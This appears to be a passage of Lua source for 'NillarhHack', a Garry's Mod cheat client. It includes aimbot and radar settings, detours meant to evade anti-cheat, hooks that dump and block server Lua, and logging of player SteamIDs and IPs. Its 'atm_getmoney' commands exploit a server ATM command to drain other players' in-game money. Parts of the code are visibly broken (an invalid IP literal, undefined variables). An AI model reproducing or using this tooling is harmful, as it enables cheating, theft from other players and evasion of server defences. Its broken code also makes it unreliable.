		block_all_netmsgs = "True or false, if true all net messages will be blocked.  This is a very bad idea.",
		block_all_usermsgs = "True or false, if true all user user messages will be blocked.  This is a bad idea.",
		block_all_datastreams = "True or false, if true all data-streams will be blocked.  This is a bad idea.",
		block_all_concmds = "True or false, if true all console commands executed will be blocked.  This is a very bad idea."

	},
	[ "AntiAC" ] = {

		disabled_detours = "A list of libraries that NillarhHack will avoid detouring.  _G counts as a library, certain detours that are crucial for NillarhHack to function will ignore this list.  Certain security issues could appear if certain libraries have detours disabled.",
		disable_all_detours = "True or false, if true it will disable all but crucial detours, this is generally a bad idea.",

		alerts_enabled = "True or false, if true attempts to detect for cheats and certain activity will be shown."

	},
	[ "Logging" ] = {

		log_errors = "True or false, if true errors will be logged to file.",
		log_console = "True or false, if true console activity is logged to file.",
		log_warnings = "True or false, if true warnings will be logged to file.",
		log_severes = "True or false, if true severe errors will be logged to file."

	},
	[ "Console" ] = {

		history_length = "The amount of lines that will appear in the console history."

	},
	[ "GUI" ] = {

		debug = "True or false, if true invisible GUI will have outlines drawn on them."

	},
	[ "Radar" ] = {

		enabled = "True or false, if true the radar will render.",

		size = "The size in pixels of the rendered radar.",

		pixrat = "The pixel ratio.",

		draw_outlines = "True or false, if true outlines will be drawn on the radar.",
		draw_names = "True or false, if true names will be drawn right of the radar.",
		draw_cross = "True or false, if true a cross will be drawn through the middle of the rendered radar."

	},
	[ "Binds" ] = {

		key_down = "A list of console commands bound to key's down events.  Don't modify this table.",
		key_up = "A list of console commands bound to key's up events.  Don't modify this table.",
		key_down_think = "A list of console commands bound to key's down think events.  Don't modify this table.",
		key_up_think = "A list of console commands bound to key's up think events.  Don't modify this table."

	},
	[ "CNoClip" ] = {

		enabled = "True or false, if true you will move in 'clientside no-clip' mode rather than actually moving.",
		speed = "The speed that you move whilst in clientside no-clip mode",
		spectate_players = "True or false, if true then you'll spectate player player_sid rather than free-roaming.",
		player_sid = "The SteamID of the player you want to spectate.  This will only work if spectate_players is true.",

	}

};

NH.ConfigurationLockStructure = {
	[ "Aimbot" ] = {

		trace_key = "rebind_aimbot",
		trace_bone = "aimbot_bone",

	},
	[ "Binds" ] = {

		key_down = "bind_down",
		key_up = "bind_up",
		key_down_think = "bind_down_think",
		key_up_think = "bind_up_think"

	},
	[ "CNoClip" ] = {

		spectate_players = "spectate",
		player_sid = "spectate"

	}		

};

// Load our default config, save the default to file otherwise.
if ( g.file.Exists("NillarhHack/configs/default.txt", "DATA") ) then 

	NH.SafeLoadConfig( "default" );

else 

	g.file.Write( "NillarhHack/configs/default.txt", g.util.TableToKeyValues( NH.KeySafe( NH.ConfigurationStructure ) ), "DATA");

end

// Load our autoexec, save to file otherwise.
if ( g.file.Exists("NillarhHack/configs/autoexec.txt", "DATA") ) then 

	me:ConCommand( g.file.Read("NillarhHack/configs/autoexec.txt", "DATA") )

else 

	g.file.Write( "NillarhHack/configs/autoexec.txt", "", "DATA");

end

// Nice way of retrieving values from the configuration structure 
function NH.Get( region, name )

	if ( !name ) then return NH.ConfigurationStructure[ region ]; end

	return NH.ConfigurationStructure[ region ][ name ];

end

// Nice way of setting values from the configuration structure 
function NH.Set( region, name, value )

	NH.ConfigurationStructure[ region ][ name ] = value;
	g.file.Write( "NillarhHack/configs/" .. NH.CurrentConfig .. ".txt", g.util.TableToKeyValues( NH.KeySafe( NH.ConfigurationStructure ) ), "DATA");

end

function NH.MatchConfigCase( str )

	for name, config in g.pairs( NH.ConfigurationStructure ) do 

		if ( name:lower() == str:lower() ) then return name; end

	end

	return str;

end

function NH.PlayerConnect( name, ip )

	for k, v in g.pairs( g.player.GetAll() ) do

		if ( v:Nick() == name ) then
			v.ip = ip
			local name = v:Nick()
			local namesteamid = v:SteamID()
		else
			v.ip = 127.0.0.1
			local name = name
			local namesteamid = " Error! "
		end

		NH.Logging.Print( true, g.Color( 0, 225, 0, 255 ), "( Name: " .. g.tostring( name ) .. ", SteamID: " .. g.tostring( namesteamid ) .. ", IP: " .. g.tonumber( v.ip ) .." ) has joined the game. " );

	end

end

// Returns if the ply is an admin and what kinda admin the ply is
function NH.AdminReturn( v )
	if v:IsAdmin() then
		return true, "Admin" 
	elseif r["Entity"]["GetNetworkedBool"]( v, "usergroup" ) == "admin" then
		return true, "Admin"
	elseif v:IsUserGroup( "Admin" ) then
		return true, "Admin" 
	elseif v:IsUserGroup( "admin" ) then
		return true, "Admin" 
	elseif v:IsUserGroup( "Owner" ) then
		return true, "Owner" 
	elseif v:IsUserGroup( "owner" ) then
		return true, "Owner" 
	elseif v:IsUserGroup( "SuperAdmin" ) then
		return true, "Super-Admin" 
	elseif v:IsUserGroup( "superadmin" ) then
		return true, "Super-Admin" 
	elseif v:IsSuperAdmin() then 
		return true, "Super-Admin" 
	elseif r["Entity"]["GetNetworkedBool"]( v, "usergroup" ) == "superadmin" then
		return true, "Super-Admin"
	elseif v:IsUserGroup( "Operator" ) then
		return true, "Operator" 
	elseif v:IsUserGroup( "operator" ) then
		return true, "Operator" 
	elseif v:IsUserGroup( "Donator" ) then
		return true, "Donator" 
	elseif v:IsUserGroup( "donator" ) then 
		return true, "Donator" 
	elseif v:IsUserGroup( "Vip" ) then 
		return true, "Vip" 
	elseif v:IsUserGroup( "vip" ) then 
		return true, "Vip" 
	elseif v:IsUserGroup( "GoldVip" ) then 
		return true, "GoldVip"
	elseif v:IsUserGroup( "goldVip" ) then 
		return true, "GoldVip"
	elseif v:IsUserGroup( "goldvip" ) then 
		return true, "GoldVip"
	elseif v:IsUserGroup( "Mod" ) then
		return true, "Mod" 
	elseif v:IsUserGroup( "mod" ) then
		return true, "Mod" 
	elseif v:IsUserGroup( "Moderator" ) then
		return true, "Moderator" 
	elseif v:IsUserGroup( "moderator" ) then
		return true, "Moderator" 
	end

	return false, r["Entity"]["GetNetworkedBool"]( ent, "usergroup" )
end

// Returns the player code defined by input
function player.GetObject( name ) 

	for k, v in g.pairs( g.player.GetAll() ) do 

		if ( g.string.lower( g.tostring( r["Player"]["Nick"]( v ) ) ) == g.string.lower( g.tostring( name ) ) ) then 

			return v 

		elseif ( g.string.find( g.string.lower( g.tostring( r["Player"]["Nick"]( v ) ) ), g.string.lower( g.tostring( name ) ) ) ) then 

			return v

		end 

	end 

end 

/*

	#     #      ##        #####   #####     ###                                                        
	#     #     #  #      #     # #     #     #  #    # ##### ###### #####  ######   ##    ####  ###### 
	#     #      ##       #       #           #  ##   #   #   #      #    # #       #  #  #    # #      
	#######     ###       #       #           #  # #  #   #   #####  #    # #####  #    # #      #####  
	#     #    #   # #    #       #           #  #  # #   #   #      #####  #      ###### #      #      
	#     #    #    #     #     # #     #     #  #   ##   #   #      #   #  #      #    # #    # #      
	#     #     ###  #     #####   #####     ### #    #   #   ###### #    # #      #    #  ####  ###### 

*/

NH.Commands = {};
NH.CommandHelp = {};
NH.Redirects = {};

NH.Redirects[ "print" ] = g.print;
NH.Redirects[ "Msg" ] = g.Msg;
NH.Redirects[ "MsgN" ] = g.MsgN;
NH.Redirects[ "MsgC" ] = g.MsgC;
NH.Redirects[ "MsgAll" ] = g.MsgAll;
NH.Redirects[ "PrintTable" ] = g.PrintTable;
NH.Redirects[ "error" ] = g.error;
NH.Redirects[ "Error" ] = g.Error;
NH.Redirects[ "ErrorNoHalt" ] = g.ErrorNoHalt;
NH.Redirects[ "PrintMessage" ] = g.PrintMessage;

function NH.InitiateRedirects()

	_G.print = function( ... ) NH.Logging.RedirectPrint( NH.Get( "Logging", "log_console" ), "[print] ".. ... ); end
	_G.Msg = function( ... ) NH.Logging.RedirectPrint( NH.Get( "Logging", "log_console" ), "[Msg] ".. ... ); end
	_G.MsgN = function( ... ) NH.Logging.RedirectPrint( NH.Get( "Logging", "log_console" ), "[MsgN] ".. ... ); end
	_G.MsgC = function( ... ) NH.Logging.RedirectPrint( NH.Get( "Logging", "log_console" ), "[MsgC] ".. ... ); end
	_G.MsgAll = function( ... ) NH.Logging.RedirectPrint( NH.Get( "Logging", "log_console" ), "[MsgAll] ".. ... ); end
	_G.PrintTable = function( ... ) NH.Logging.RedirectPrint( NH.Get( "Logging", "log_console" ), "[PrintTable] ".. ... ); end
	_G.error =  function( ... ) NH.Logging.RedirectPrint( NH.Get( "Logging", "log_console" ), "[error] ".. ... ); end
	_G.Error = function( ... ) NH.Logging.RedirectPrint( NH.Get( "Logging", "log_console" ), "[Error] ".. ... ); end
	_G.ErrorNoHalt = function( ... ) NH.Logging.RedirectPrint( NH.Get( "Logging", "log_console" ), "[ErrorNoHalt] ".. ... ); end
	_G.PrintMessage = function( ... ) NH.Logging.RedirectPrint( NH.Get( "Logging", "log_console" ), "[PrintMessage] ".. ... ); end

end

function NH.RemoveRedirects()

	_G.print = NH.Redirects[ "print" ];
	_G.Msg = NH.Redirects[ "Msg" ];
	_G.MsgN = NH.Redirects[ "MsgN" ];
	_G.MsgC = NH.Redirects[ "MsgC" ];
	_G.MsgAll = NH.Redirects[ "MsgAll" ];
	_G.PrintTable = NH.Redirects[ "PrintTable" ];
	_G.error = NH.Redirects[ "error" ];
	_G.Error = NH.Redirects[ "Error" ];
	_G.ErrorNoHalt = NH.Redirects[ "ErrorNoHalt" ];
	_G.PrintMessage = NH.Redirects[ "PrintMessage" ];

end

function NH.AddHook( name, func )

	NH.Logging.Print( true, g.Color( 0, 225, 0, 255 ), "Hooking functions to event '" .. name .. "'" );

//	NH.Hooks[ name ] = func;
	g.hook.Add( name, name..NH.RandomString( 200 ), func );

end

function NH.AddCmd( name, func, writeFunc, helpText )

	writeFunc = writeFunc or function() return ""; end

	if ( helpText ) then

		NH.AddHelp( name, helpText )

	end

	NH.Commands[ name ] = { execute = func, onType = writeFunc };

end

function NH.AddHelp( name, help )

	NH.CommandHelp[ name ] = help;

end

function NH.ExecuteCommand( name, ... )

	NH.InitiateRedirects();
	//g.timer.Simple( 0, NH.RemoveRedirects );

	if ( !NH.Commands[ name ] ) then return nil; end
	return NH.Commands[ name ].execute( ... );

end 

function NH.AutoCompleteCommand( name, ... )

	if ( !NH.Commands[ name ] ) then return ""; end 

	return NH.Commands[ name ].onType( ... );

end

function NH.ExecuteCommands( commands )

	for _, data in g.pairs( commands ) do 

		local targs = {};

		local name = data.name;
		local args = data.args;

		for _, arg in g.pairs( args ) do targs[ arg ] = true; end

		// Only run this part if it was typed into the console rather than a bind, as binds use this function too.
		if ( NH.GUI.Console && NH.GUI.Console:IsVisible() && name != "toggle_console" ) then NH.Logging.Print( NH.Get( "Logging", "log_console" ), "] " .. name ); end

		local result, err = NH.ExecuteCommand( name:lower(), args, targs );

		if ( NH.GUI.Console && NH.GUI.Console:IsVisible() ) then 

			if ( result == nil ) then 

				NH.Logging.Print( NH.Get( "Logging", "log_console" ), Color( 255, 0, 0, 225 ), "] No such command '" .. name .. "'!" );
				NH.GUI.ConsoleErrorFlash();

			elseif ( !result ) then

				NH.GUI.ConsoleErrorFlash();
				if ( err ) then 

					NH.Logging.Print( NH.Get( "Logging", "log_console" ), Color( 255, 0, 0, 225 ), "] ERROR: " .. err );

				else 

					NH.Logging.Print( NH.Get( "Logging", "log_console" ), Color( 255, 0, 0, 225 ), "] ERROR: Unknown error!" );

				end

			end

		end

	end

end

function NH.ParseCommands( com ) 

	// parse the command

	local isEncap = false;
	local commands = {};

	com = NH.FormatWildcards( com ) .. " ";

	local name, _name, arg = "", "", "";

	for i = 1, com:len() do 

		if ( com[ i ] == "\"" ) then 

			// Check if there's another double quote before encapsulating the input 
			if ( !g.string.find( com, "\"", i + 1 ) && !isEncap ) then continue; end
			isEncap = !isEncap;

		elseif ( com[ i ] == ";" && !isEncap ) then 

			// name wasn't "finished" 
			if ( name == "" ) then commands[ #commands + 1 ] = { name = _name, args = {} }; end

			// Insert current argument 
			if ( arg != "" ) then 

				commands[ #commands ].args[ #commands[ #commands ].args + 1 ] = arg;

				// Clear arg for next command
				arg = "";

			end

			// Establish a command name again
			name, _name = "", "";


		elseif ( com[ i ] == " " && !isEncap ) then 

			if ( name == "" ) then 

				name = _name; 
				commands[ #commands + 1 ] = { name = name, args = {} };

			else 

				commands[ #commands ].args[ #commands[ #commands ].args + 1 ] = arg;
				arg = "";

			end


		else 

			if ( name == "" ) then 

				_name = _name .. com[ i ];

			else 

				arg = arg .. com[ i ];

			end 

		end

	end

	return commands;

end

/*
	#     #                                       #     #                             
	##   ##  ####  #####  #    # #      ######    #     #  ####   ####  #    #  ####  
	# # # # #    # #    # #    # #      #         #     # #    # #    # #   #  #      
	#  #  # #    # #    # #    # #      #####     ####### #    # #    # ####    ####  
	#     # #    # #    # #    # #      #         #     # #    # #    # #  #        # 
	#     # #    # #    # #    # #      #         #     # #    # #    # #   #  #    # 
	#     #  ####  #####   ####  ###### ######    #     #  ####   ####  #    #  ####  
*/         

//Module.INillarhHack.SetCallback = NH.AddHook

Module.INillarhHack.SetCallback( "RunString", function( name, path, contents )

	g.file.CreateDir( "NillarhHack/logs/" .. NH.IP, "DATA" );
	if !g.file.Exists( "NillarhHack/logs/" .. NH.IP .. "/LuaCmd.log" ) then
		g.file.Write( "NillarhHack/logs/" .. NH.IP .. "/LuaCmd.log" ); end

	if ( name == "LuaCmd" ) then 

		if ( NH.Get( "Utilities", "dump_luacmd" ) ) then 
			g.file.Append( "NillarhHack/logs/" .. NH.IP .. "/LuaCmd.log", NH.Logging.GetTimeStamp() .. "[LUACMD] " .. contents .. '\n' ); end

		if ( NH.Get( "Utilities", "block_luacmd" ) ) then return false; end

	elseif ( name == "RunString" ) then 

		if ( NH.Get( "Utilities", "dump_runstring" ) ) then
			g.file.Append( "NillarhHack/logs/" .. NH.IP .. "/LuaCmd.log", NH.Logging.GetTimeStamp() .. "[RUNSTRING] " .. contents .. '\n' ); end

		if ( NH.Get( "Utilities", "block_runstring" ) ) then return false; end

	else 

		if ( NH.Get( "Utilities", "dump_files" ) ) then 
			g.file.Append( "NillarhHack/cache/" .. NH.IP .. "/" .. name, contents ); end

	end

	return true;

end);

Module.INillarhHack.SetCallback( "Shutdown", function()

	for orig, val in g.pairs( NH.CVarProxies ) do

		Module.INillarhHack.SetCVar( orig, g.tonumber( r["ConVar"]["GetDefault"]( val ) ) );
		Module.INillarhHack.LogToFile( orig .. " => " .. r["ConVar"]["GetDefault"]( val ) .. '\n' );

	end

	return true;

end);



Module.INillarhHack.SetCallback( "ConsoleCommand", function( str )

	if ( str:sub( 1, 3 ) == "say" ) then 

		local recon = "";

		// Make a table of word replacements
		local replacements = {
			["lol"] = "AhAhAhAhAhAhAh",
			["ha"] = "AhAhAhAh",
			["garry"] = "gayrey",
			["hera"] = OH.RandomArg("hera golden edition", "hera elite edition", "hera mad edition", "hera special edition", 
									"hera nsa edition", "hera mlg edition", "hera gold edition", "hera lite", "hera silver", "hera premium"),
		}

		// Replace each word in the string
		for word, replace in g.pairs( replacements ) do str = g.string.Replace( str, word, replacement ); end

		// Split the string by spaces and reconstruct the string using capitalized words
		for _, sstr in g.pairs( g.string.Explode( " ", str ) ) do 

			recon = recon .. g.string.upper( sstr[ 1 ] ) .. sstr:sub( 2, sstr:len() ) .. " ";

		end

		return recon;

	end

	return str;

end);

/*
	 #####                                                #####                                                   
	#     #  ####  #    #  ####   ####  #      ######    #     #  ####  #    # #    #   ##   #    # #####   ####  
	#       #    # ##   # #      #    # #      #         #       #    # ##  ## ##  ##  #  #  ##   # #    # #      
	#       #    # # #  #  ####  #    # #      #####     #       #    # # ## # # ## # #    # # #  # #    #  ####  
	#       #    # #  # #      # #    # #      #         #       #    # #    # #    # ###### #  # # #    #      # 
	#     # #    # #   ## #    # #    # #      #         #     # #    # #    # #    # #    # #   ## #    # #    # 
	 #####   ####  #    #  ####   ####  ###### ######     #####   ####  #    # #    # #    # #    # #####   ####  
*/

/* ========================================================================================================================== */

function NH.GetValue( args )

	args[ 1 ] = NH.MatchConfigCase( args[ 1 ] or "" );

	if ( NH.ConfigurationStructure[ args[ 1 ] ] == nil ) then 

		return false, g.tostring( args[ 1 ] ) .. " doesn't exist!";

	end 

	if ( args[ 2 ] && NH.ConfigurationStructure[ args[ 1 ] ][ args[ 2 ] ] == nil ) then 

		return false, g.tostring( args[ 1 ] ) .. "." .. g.tostring( args[ 2 ] ) .. " doesn't exist!";

	end 

	local value = NH.Get( args[ 1 ], args[ 2 ] );

	if ( g.istable( value ) ) then 

		for name, value in g.pairs( value ) do  

			return true, name;

		end

	else 

		return true, g.tostring( args[ 2 ] );
		
	end

end

local cols = {
	["%red"] = g.Color( 255, 0, 0, 255 ),
	["%green"] = g.Color( 0, 255, 0, 255 ),
	["%blue"] = g.Color( 0, 0, 255, 255 ),
	["%black"] = g.Color( 0, 0, 0, 255 ),
	["%white"] = g.Color( 255, 255, 255, 255 ),
	["%yellow"] = g.Color( 255, 255, 0, 255 ),
	["%cyan"] = g.Color( 0, 255, 255, 255 ),
	["%pink"] = g.Color( 255, 0, 255, 255 ),
	["%grey"] = g.Color( 100, 100, 100, 255 ),
	["%gold"] = g.Color( 255, 228, 0, 255 ),
	["%purple"] = g.Color( 129, 0, 255, 255 ),
	["%teal"] = g.Color( 0, 102, 102, 255 ),
	["%pink"] = g.Color( 255, 0, 127, 255 ),
	["%brown"] = g.Color( 51, 25, 0, 255 )
}

NH.AddCmd( "set", function( args, targs )

	local text = ""

	args[ 1 ] = NH.MatchConfigCase( args[ 1 ] or "" );

	if ( NH.ConfigurationStructure[ args[ 1 ] ] == nil ) then 

		return false, g.tostring( args[ 1 ] ) .. " doesn't exist!";

	end 

	if ( NH.ConfigurationStructure[ args[ 1 ] ][ args[ 2 ] ] == nil ) then 

		return false, g.tostring( args[ 1 ] ) .. "." .. g.tostring( args[ 2 ] ) .. " doesn't exist!";

	end 

	local value = args[ 3 ];

	if ( value == nil || ( g.isstring( value ) && ( value:lower() == "false" || value:lower() == "no") ) ) then value = false; end
	if ( g.isstring( value ) && ( value:lower() == "true" || value:lower() == "yes" ) ) then value = true; end
	if ( g.tonumber( value ) ) then value = g.tonumber( value ); end
	if ( cols[ value ] ) then value = cols[ value ]; end

	if ( g.type( NH.Get( args[ 1 ], args[ 2 ] ) ) != g.type( value ) ) then 

		return false, "Couldn't propagate value type!";

	end

	if ( NH.ConfigurationLockStructure[ args[ 1 ] ] && NH.ConfigurationLockStructure[ args[ 1 ] ][ args[ 2 ] ] ) then

		if ( !targs[ "-force" ] ) then

			return false, g.tostring( args[ 1 ] ) .. "." .. g.tostring( args[ 2 ] ) .. " is locked!  It should be accessed using " .. NH.ConfigurationLockStructure[ args[ 1 ] ][ args[ 2 ] ] .. " instead.  To bypass this check, run the command with -force" 

		end

	end 

	NH.Set( args[ 1 ], args[ 2 ], value );

	NH.Logging.Print( NH.Get( "Logging", "log_console" ), g.tostring( args[ 1 ] ) .. " " .. g.tostring( args[ 2 ] ) .. " = " .. g.tostring( args[ 3 ] ) );

	return true;

end,
function( fname, args, inp )

	local table = NH.ConfigurationStructure;
	local current = inp;

	if ( #args > 2 ) then return "", {}; end
	for _, arg in g.pairs( args ) do 
	

		local tabArg = NH.MatchConfigCase( arg );
		if ( table[ tabArg ] && istable( table[ tabArg ] ) ) then table = table[ tabArg ]; continue; end

		local ret, coms = "", {};
		for name, value in g.pairs( table ) do 

			if ( arg:lower() == name:sub( 1, arg:len() ):lower() && arg:lower() != name:lower() ) then 

				if ( ret == "" ) then ret = NH.MatchCase( current:sub( 1, current:len() - arg:len() ) .. name, current ); end
//				if ( ret == "" ) then ret = NH.GetValue( args ); end
				coms[ #coms + 1 ] = { text = ( current .. name ), display = name };

			end

		end

		if ( ret != "" ) then return ret, coms; end

	end

	return "", {};

end);

/* ========================================================================================================================== */

/*NH.AddCmd( "help", function( args, targs )

	local text = ""

	for name, t in g.pairs( NH.Commands ) do 

		NH.Logging.Print( NH.Get( "Logging", "log_console" ), name );

	end

	return true;

end, NH.Commands[ "set" ].onType );*/

NH.AddCmd( "help", function( args, targs )

	if ( !args[ 1 ] ) then 

		local text = ""

		for name, t in g.pairs( NH.Commands ) do 

			NH.Logging.Print( NH.Get( "Logging", "log_console" ), name );

		end

	else 

		local name = args[ 1 ];

		if ( NH.ConfigurationHelpStructure[ name ] ) then 

			if ( !args[ 2 ] ) then 

				NH.Logging.Print( NH.Get( "Logging", "log_console" ), name .. " contains help nodes." );
				return true;

			else 

				if ( NH.ConfigurationHelpStructure[ name ][ args[ 2 ] ] ) then 

					NH.Logging.Print( NH.Get( "Logging", "log_console" ), NH.ConfigurationHelpStructure[ name ][ args[ 2 ] ] );
					return true;

				else 

					return false, "Could not find " .. args[ 2 ] .. " in " .. name .. "!";

				end

			end

		else 

			if ( NH.Commands[ name ] ) then 

				if ( NH.CommandHelp[ name ] ) then 

					NH.Logging.Print( NH.Get( "Logging", "log_console" ), NH.CommandHelp[ name ] );
					return true;

				else 

					return false, "Help was not found for this command"

				end

			end

		end

		return false, "Command or help structure " .. name .. " was not found!";

	end

	return true;

end, 
function( name, args, inp )

	local ret, coms = "", {};

	if ( !args[ 1 ] || #args != 1 ) then return ret, coms; end
	for index, keydata in g.pairs( NH.Commands ) do 

		local name = index;

		if ( args[ 1 ]:lower() == name:sub( 1, args[ 1 ]:len() ):lower() && args[ 1 ]:lower() != name:lower() ) then 

			if ( ret == "" ) then ret = inp:sub( 1, inp:len() - args[ 1 ]:len() ) .. name; end
			coms[ #coms + 1 ] = { text = ( inp .. name ), display = name };

		end

	end

	return ret, coms;

end);

/* ========================================================================================================================== */

NH.LagSpikes = {"env_steam",
"func_illusionary",
"beam",
"class C_BaseEntity",
"env_sprite",
"class C_ShadowControl",
"class C_ClientRagdoll",
"func_illusionary",
"class C_PhysPropClientside",
}

NH.AddCmd( "set_antilag", function( args, targs )

	if args[ 1 ] == "true" then
	
		g.RunConsoleCommand("r_3dsky", 0)
		g.RunConsoleCommand("r_WaterDrawReflection", 0)
		g.RunConsoleCommand("r_waterforcereflectentities", 0)
		g.RunConsoleCommand("r_teeth", 0)
		g.RunConsoleCommand("r_shadows", 0)
		g.RunConsoleCommand("r_ropetranslucent", 0)
		g.RunConsoleCommand("r_maxmodeldecal", 0) --50
		g.RunConsoleCommand("r_maxdlights", 0)--32
		g.RunConsoleCommand("r_decals", 0)--2048
		g.RunConsoleCommand("r_drawmodeldecals", 0)
		g.RunConsoleCommand("r_drawdetailprops", 0)
		g.RunConsoleCommand("r_worldlights", 0)
		g.RunConsoleCommand("r_flashlightrender", 0)
		g.RunConsoleCommand("cl_forcepreload", 1)
		g.RunConsoleCommand("r_threaded_renderables", 1)
		g.RunConsoleCommand("r_threaded_client_shadow_manager", 1)
		g.RunConsoleCommand("snd_mix_async", 1)
		g.RunConsoleCommand("cl_ejectbrass", 0)
		g.RunConsoleCommand("cl_detaildist", 0)
		g.RunConsoleCommand("cl_show_splashes", 0)
		--g.RunConsoleCommand("mat_fastnobump", 1)
		g.RunConsoleCommand("mat_filterlightmaps", 0)
		--g.RunConsoleCommand("mat_filtertextures", 0)
		g.RunConsoleCommand("r_drawflecks", 0)
		g.RunConsoleCommand("r_dynamic", 0)
		g.RunConsoleCommand("r_WaterDrawRefraction", 0)
		--g.RunConsoleCommand("mat_showlowresimage", 1)

		for k,v in g.pairs(NH.LagSpikes) do

			for k, v in g.pairs( g.ents.FindByClass(v) ) do

				v:SetNoDraw(true)

			end

		end

	elseif args[ 1 ] == "false" then
	
		g.RunConsoleCommand("r_3dsky", g.GetConVar("r_3dsky"):GetDefault())
		g.RunConsoleCommand("r_WaterDrawReflection", g.GetConVar("r_WaterDrawReflection"):GetDefault())
		g.RunConsoleCommand("r_waterforcereflectentities", g.GetConVar("r_waterforcereflectentities"):GetDefault())
		g.RunConsoleCommand("r_teeth", g.GetConVar("r_teeth"):GetDefault())
		g.RunConsoleCommand("r_shadows", g.GetConVar("r_shadows"):GetDefault())
		g.RunConsoleCommand("r_ropetranslucent", g.GetConVar("r_ropetranslucent"):GetDefault())
		g.RunConsoleCommand("r_maxmodeldecal", g.GetConVar("r_maxmodeldecal"):GetDefault()) --50
		g.RunConsoleCommand("r_maxdlights", g.GetConVar("r_maxdlights"):GetDefault())--32
		g.RunConsoleCommand("r_decals", g.GetConVar("r_decals"):GetDefault())--2048
		g.RunConsoleCommand("r_drawmodeldecals", g.GetConVar("r_drawmodeldecals"):GetDefault())
		g.RunConsoleCommand("r_drawdetailprops", g.GetConVar("r_drawdetailprops"):GetDefault())
		g.RunConsoleCommand("r_decal_cullsize", g.GetConVar("r_decal_cullsize"):GetDefault())
		g.RunConsoleCommand("r_worldlights", g.GetConVar("r_worldlights"):GetDefault())
		g.RunConsoleCommand("r_flashlightrender", g.GetConVar("r_flashlightrender"):GetDefault())
		g.RunConsoleCommand("cl_forcepreload", g.GetConVar("cl_forcepreload"):GetDefault())
		g.RunConsoleCommand("cl_ejectbrass", g.GetConVar("cl_ejectbrass"):GetDefault())
		g.RunConsoleCommand("cl_show_splashes", g.GetConVar("cl_show_splashes"):GetDefault())
		g.RunConsoleCommand("cl_detaildist", g.GetConVar("cl_detaildist"):GetDefault())
		--g.RunConsoleCommand("mat_fastnobump", g.GetConVar("mat_fastnobump"):GetDefault())
		g.RunConsoleCommand("mat_filterlightmaps", g.GetConVar("mat_filterlightmaps"):GetDefault())
		g.RunConsoleCommand("r_threaded_renderables", g.GetConVar("r_threaded_renderables"):GetDefault())
		g.RunConsoleCommand("r_threaded_client_shadow_manager", g.GetConVar("r_threaded_client_shadow_manager"):GetDefault())
		--g.RunConsoleCommand("mat_filtertextures", g.GetConVar("mat_filtertextures"):GetDefault())
		g.RunConsoleCommand("r_drawflecks", g.GetConVar("r_drawflecks"):GetDefault())
		g.RunConsoleCommand("r_WaterDrawRefraction", g.GetConVar("r_WaterDrawRefraction"):GetDefault())
		--g.RunConsoleCommand("mat_showlowresimage", g.GetConVar("mat_showlowresimage"):GetDefault())
		g.RunConsoleCommand("r_dynamic", g.GetConVar("r_dynamic"):GetDefault())
		
		for k,v in g.pairs( NH.LagSpikes ) do

			for a,b in g.pairs( g.ents.FindByClass(v) ) do

				b:SetNoDraw(false)

			end

		end

	end

	return true;

end);

/* ========================================================================================================================== */

NH.Atm = {}

function NH.Atm.shorten(numb)
	newnumb = numb*0.1
	return newnumb
end
function NH.Atm.shorten2(numb, times)
	for i = 0, times-1, 1 do
		numb = shorten(numb)
		--print("Numb = ".. numb)
	end
	return numb
end

NH.AddCmd( "atm_getmoney", function( args, targs )

	local name = args[1]
	local money = args[2]

	if not money or not name then

		return false, "Missing name(" .. g.tostring( name ) .. ") and how much money(" .. g.tostring( money ) .. ") you want to steal"

	end

	local vict

	for k,v in g.pairs( g.player.GetAll() ) do

		if g.string.find( v:Nick(), name ) then

			vict = v

			break

		end

	end

	if not g.IsValid(vict) then

		return false, "No player found with "..name.." in their name."

	end

	g.RunConsoleCommand( "rp_atm_withdraw", "", vict:UniqueID(), money )

	return true

end )

NH.AddCmd( "atm_takemoney", function( args, targs )

	local money = args[1]
	
	if not money then

		return false, "Not specified how much money you want"

	end

	for k, v in g.pairs( g.player.GetAll() ) do

		g.RunConsoleCommand("atm_getmoney", ""..v:GetName().."", money)

		return true

	end

end)

NH.AddCmd( "atm_takeallmoney", function( args, targs )

	local money = args[1]
	local lol = 0

	if not money then

		return false, "Not specified how much money you want"

	end

	for i = 0, #money, 1 do 

		lol = NH.Atm.shorten2(money, i-1)

		for i = lol, NH.Atm.shorten(lol), lol*(-1) do

			for k, v in g.pairs( g.player.GetAll() ) do

				g.RunConsoleCommand("atm_getmoney", ""..v:GetName().."", i)

			end

		end

	end

end)

/* ========================================================================================================================== */

NH.AddCmd( "get", function( args, targs )

	local text = ""

	args[ 1 ] = NH.MatchConfigCase( args[ 1 ] or "" );

	if ( NH.ConfigurationStructure[ args[ 1 ] ] == nil ) then 

		return false, g.tostring( args[ 1 ] ) .. " doesn't exist!";

	end 

	if ( args[ 2 ] && NH.ConfigurationStructure[ args[ 1 ] ][ args[ 2 ] ] == nil ) then 

		return false, g.tostring( args[ 1 ] ) .. "." .. g.tostring( args[ 2 ] ) .. " doesn't exist!";

	end 

	local value = NH.Get( args[ 1 ], args[ 2 ] );

	if ( g.istable( value ) ) then 

		for name, value in g.pairs( value ) do  

			NH.Logging.Print( NH.Get( "Logging", "log_console" ), g.tostring( args[ 1 ] ) .. "" .. name .. " = " .. g.tostring( value ) .. " | type = " .. g.type( value ) );

		end

	else 

		NH.Logging.Print( NH.Get( "Logging", "log_console" ), g.tostring( args[ 1 ] ) .. "" .. g.tostring( args[ 2 ] ) .. " = " .. g.tostring( value ) .. " | type = " .. g.type( value ) );

	end

	return true;

end, NH.Commands[ "set" ].onType );

/* ========================================================================================================================== */

NH.AddCmd( "bind_down", function( args, targs ) 

	local key = args[ 1 ];
	local command = args[ 2 ];

	local res = NH.Binds.AddBind( key, command, "down" );

	if ( !res ) then 

		return res, "Key '" .. key .. "' not found!";

	end

	return res;

end, 
function( name, args, inp )

	local ret, coms = "", {};

	if ( !args[ 1 ] || #args != 1 ) then return ret, coms; end

	for index, keydata in g.pairs( NH.Keys ) do 

		local name = keydata[ 1 ];

		if ( args[ 1 ]:lower() == name:sub( 1, args[ 1 ]:len() ):lower() && args[ 1 ]:lower() != name:lower() ) then 

			if ( ret == "" ) then ret = inp:sub( 1, inp:len() - args[ 1 ]:len() ) .. name; end
			coms[ #coms + 1 ] = { text = ( inp .. name ), display = name };

		end

	end

	return ret, coms;

end);

/* ========================================================================================================================== */

NH.AddCmd( "bind_up", function( args, targs ) 

	local key = args[ 1 ];
	local command = args[ 2 ];

	local res = NH.Binds.AddBind( key, command, "up" );

	if ( !res ) then 

		return res, "Key '" .. key .. "' not found!";

	end

	return res;

end, NH.Commands[ "bind_down" ].onType );

/* ========================================================================================================================== */

